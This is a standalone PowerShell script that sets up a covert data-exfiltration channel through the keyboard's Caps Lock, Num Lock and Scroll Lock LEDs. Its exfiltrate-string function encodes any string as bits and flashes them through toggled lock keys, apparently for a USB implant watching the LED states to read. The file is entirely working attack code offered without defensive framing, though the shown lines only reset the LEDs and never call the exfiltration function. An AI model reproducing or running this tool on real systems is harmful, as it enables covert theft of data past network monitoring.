$keyBoardObject = New-Object -ComObject WScript.Shell 

$CAPSLOCK = @{"CONTROL" = "{CAPSLOCK}"; "STATUS" = "CapsLock"}
$NUMLOCK = @{"CONTROL" = "{NUMLOCK}"; "STATUS" = "NumLock"}
$SCROLLLOCK = @{"CONTROL" = "{SCROLLLOCK}"; "STATUS" = "Scroll"}
$allLEDs = ($CAPSLOCK, $NUMLOCK, $SCROLLLOCK)

$timingLED = $CAPSLOCK
$firstBitLED = $SCROLLLOCK
$secondBitLED = $NUMLOCK
$sendDelay = 5


function get-LEDState($LED)
{
if ($LED -notin $allLEDs ){return $False;}
if([System.Windows.Forms.Control]::IsKeyLocked($LED["STATUS"]))
{return $True}
else
{return $False}
}

function set-LEDState($LED, [bool]$State)
{
if ($LED -notin $allLEDs ){ return $False;}
if ($State -ne (get-LEDState -LED $LED))
{
switch-LEDState($LED)
}
return $True
}

function switch-LEDState($LED)
{
if ($LED -notin $allLEDs ){return $False;}
$Script:keyBoardObject.SendKeys($LED["CONTROL"])
WRITE-HOST "Pressing $($LED['Control'])"
Start-Sleep -Milliseconds $sendDelay
return $True
}

function send-TwoBits([bool]$bit1,[bool]$bit2)
{
$r = set-LEDState $firstBitLED $bit1
$r = set-LEDState $secondBitLED $bit2
$r = switch-LEDState $timingLED
}

function exfiltrate-string($string)
{
$byteArray = [System.Text.Encoding]::UTF8.GetBytes($string)
foreach ($byte in $byteArray)
{
$binaryByte = [System.Convert]::ToString($byte,2).PadLeft(8,'0')
for ($i = 0; $i -lt 8; $i += 2)
{
$bit1 = $false
$bit2 = $false
if ($binarybyte[$i] -eq "1"){$bit1 = $true}
if ($binarybyte[($i+1)] -eq "1"){$bit2 = $true}
send-TwoBits $bit1 $bit2
write-host "Sent: "$bit1 $bit2 -Separator " "
}
Write-Host ""
}
}

set-LEDState $allLEDs[0] $False
set-LEDState $allLEDs[1] $False
set-LEDState $allLEDs[2] $False